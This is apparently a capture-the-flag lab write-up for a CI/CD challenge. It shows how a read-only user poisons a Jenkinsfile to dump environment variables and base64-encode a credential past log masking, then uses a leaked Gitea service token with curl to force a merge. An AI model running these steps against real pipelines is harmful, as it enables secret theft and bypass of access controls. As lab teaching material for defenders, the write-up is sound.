# Caterpillar - Attack

**Technique:** CICD-SEC-2, Inadequate Identity and Access Management. A
low-privilege pipeline's build environment exposed a higher-privilege
service credential, which was then used to bypass a source control merge
restriction the low-privilege account could not bypass directly.

## Steps

1. Since `thealice` has read-only access to `Wonderland/caterpillar`, forked
   the repository to the `thealice` account rather than attempting to push
   a branch directly.
2. Cloned the fork and created a working branch:
   ```
   git clone http://thealice:thealice@localhost:3000/thealice/caterpillar.git
   cd caterpillar
   git checkout -b poc/leak-token
   ```
3. Edited the Jenkinsfile, adding an early `Debug Env` stage that dumps every
   environment variable available to the build (`printenv`), and modified the
   existing `deploy` stage to also echo the target credential, base64-encoded
   to bypass Jenkins' log masking, before the existing curl call:
   ```groovy
   stage ('Debug Env') {
       steps {
           sh 'printenv'
       }
   }
   ```
   ```groovy
   withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'flag2', passwordVariable: 'TOKEN')]) {
       sh 'echo $TOKEN | base64'
       sh 'curl -isSL "http://wonderland:1234/api/user" -H "Authorization: Token ${TOKEN}" -H "Content-Type: application/json" || true'
   }
   ```
4. Pushed the branch and opened a pull request from
   `thealice/caterpillar:poc/leak-token` targeting
   `Wonderland/caterpillar:main`. This is possible in Gitea even without
   write access to the target repository, the same way opening a PR from a
   fork works on GitHub.
5. The `wonderland-caterpillar-test` job auto-built the PR. Its `Debug Env`
   output included a variable `GITEA_TOKEN`, a service credential used
   internally by the Jenkins-Gitea integration for tasks such as cloning
   repositories and posting build statuses back to Gitea.
6. Used that leaked token against the Gitea API to merge the PR directly,
   bypassing the merge restriction that `thealice` alone could not:
   ```
   curl -X POST "http://localhost:3000/api/v1/repos/Wonderland/caterpillar/pulls/1/merge" \
     -H "Authorization: token <leaked GITEA_TOKEN>" \
     -H "Content-Type: application/json" \
     -d '{"Do": "merge"}'
   ```
7. The merge into `main` triggered `wonderland-caterpillar-prod`, which does
   have access to the target `flag2` credential. Its `deploy` stage now ran
   (the `when` condition was satisfied) and printed the base64-encoded
   credential value before the unrelated `curl` call to an internal
   hostname failed (harmlessly, the credential was already captured by
   that point).
8. Decoded the output locally with `base64 -d` to recover the credential.

## Key Takeaway

Read-only access to source control is not sufficient isolation on its own
if the automation that connects the SCM to the CI system carries broader
permissions than the human account it is acting on behalf of, and that
automation's credential is reachable from a build any user with PR rights
can trigger.
